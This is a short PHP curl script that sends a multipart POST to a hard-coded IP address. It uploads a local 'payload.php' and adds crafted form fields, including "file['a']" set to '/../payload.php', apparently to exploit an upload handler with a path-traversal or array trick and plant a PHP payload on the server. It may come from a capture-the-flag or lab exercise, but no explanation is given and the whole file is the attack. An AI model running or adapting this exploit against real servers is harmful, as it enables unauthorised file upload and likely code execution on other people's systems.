<?php

$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => "http://173.220.202.12",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  CURLOPT_POSTFIELDS => array('file'=> new CURLFILE('payload.php'),'file[0]' => '111','file[\'a\']' => '/../payload.php','hello' => 'payload.php','submit' => 'payload'),
//   CURLOPT_HTTPHEADER => array(
//     "Content-Type: multipart/form-data; boundary=--------------------------120991977300767922553770"
//   ),
));

$response = curl_exec($curl);

curl_close($curl);
echo $response;
